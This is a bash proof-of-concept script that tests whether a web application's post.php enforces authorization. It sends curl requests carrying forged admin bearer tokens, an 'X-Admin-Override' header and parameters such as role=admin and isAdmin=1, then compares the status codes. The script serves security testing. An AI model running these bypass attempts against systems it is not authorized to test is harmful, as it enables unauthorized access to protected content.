#!/bin/bash

# POC: Missing Authorization - No Access Control Enforcement
# This script demonstrates that the application has no authorization mechanism
# and serves all posts regardless of authorization headers, role parameters, or admin overrides

TARGET_URL="${1:-http://localhost}"
POST_ID="${2:-1}"

echo "[*] Testing Missing Authorization Controls on post.php"
echo "[*] Target: $TARGET_URL"
echo "[*] Post ID: $POST_ID"
echo ""

# Function to make request and show results
test_authorization() {
    local test_name="$1"
    local curl_args="$2"
    
    echo "[Test] $test_name"
    echo "Command: curl -s -w '\n%{http_code}' $curl_args"
    
    # Capture both response and HTTP code
    RESPONSE=$(eval "curl -s -w '\n%{http_code}' $curl_args")
    HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
    BODY=$(echo "$RESPONSE" | head -n-1)
    
    echo "HTTP Status: $HTTP_CODE"
    
    # Show if content was returned
    if [ -n "$BODY" ] && [ "$BODY" != "Post not found" ]; then
        echo "Response Length: $(echo "$BODY" | wc -c) bytes"
        echo "Result: ✓ Content served"
        echo "$BODY"
    else
        echo "Result: No content or error"
    fi
    echo ""
    
    echo "$HTTP_CODE"
}

# Test 1: Baseline access
echo "========== AUTHORIZATION BYPASS TESTS =========="
echo ""
CODE1=$(test_authorization "Baseline - No authorization" "-s \"$TARGET_URL/post.php?id=$POST_ID\"")

# Test 2: With Authorization header
CODE2=$(test_authorization "Authorization: Bearer admin-token" "-s -H 'Authorization: Bearer admin-token' \"$TARGET_URL/post.php?id=$POST_ID\"")

# Test 3: With Admin Override header
CODE3=$(test_authorization "X-Admin-Override: true (admin override)" "-s -H 'X-Admin-Override: true' \"$TARGET_URL/post.php?id=$POST_ID\"")

# Test 4: With role parameter
CODE4=$(test_authorization "Role parameter: role=admin" "-s \"$TARGET_URL/post.php?id=$POST_ID&role=admin\"")

# Test 5: Privilege escalation attempt
CODE5=$(test_authorization "Privilege escalation: isAdmin=1" "-s \"$TARGET_URL/post.php?id=$POST_ID&isAdmin=1\"")

# Test 6: Unlock parameter attempt
CODE6=$(test_authorization "Unlock parameter: action=unlock" "-s \"$TARGET_URL/post.php?id=$POST_ID&action=unlock\"")

# Test 7: Combined authorization attempts
CODE7=$(test_authorization "Combined multiple authorization headers and parameters" "-s -H 'Authorization: Bearer admin' -H 'X-Admin-Override: true' \"$TARGET_URL/post.php?id=$POST_ID&role=admin&isAdmin=1&action=unlock\"")

# Analysis
echo "========== ANALYSIS =========="
echo ""
echo "HTTP Status Codes Received:"
echo "  Baseline:           $CODE1"
echo "  Bearer Token:       $CODE2"
echo "  Admin Override:     $CODE3"
echo "  Role Parameter:     $CODE4"
echo "  Privilege Escalate: $CODE5"
echo "  Unlock Parameter:   $CODE6"
echo "  Combined Attempt:   $CODE7"
echo ""

# Check if all are the same
if [ "$CODE1" = "$CODE2" ] && [ "$CODE2" = "$CODE3" ] && [ "$CODE3" = "$CODE4" ] && [ "$CODE4" = "$CODE5" ] && [ "$CODE5" = "$CODE6" ] && [ "$CODE6" = "$CODE7" ]; then
    echo "✓ VULNERABILITY CONFIRMED: All requests returned identical HTTP status code"
    echo "✓ Authorization controls are NOT enforced"
    echo "✓ No difference between requests with and without authorization attempts"
else
    echo "Note: Different status codes received - may indicate some control is present"
fi

# Check for 403 or other access control indicators
if echo "$CODE1 $CODE2 $CODE3 $CODE4 $CODE5 $CODE6 $CODE7" | grep -q "403"; then
    echo "⚠ Some requests returned 403 Forbidden - access control may be present"
else
    echo "✓ No 403 Forbidden responses - consistent access regardless of authorization"
fi

echo ""
echo "========== CONCLUSION =========="
echo "Authorization validation is missing. The application serves content regardless of:"
echo "  • Authorization headers (Bearer tokens)"
echo "  • Admin override headers"
echo "  • Role parameters"
echo "  • Privilege escalation attempts"
echo "  • Combined authorization methods"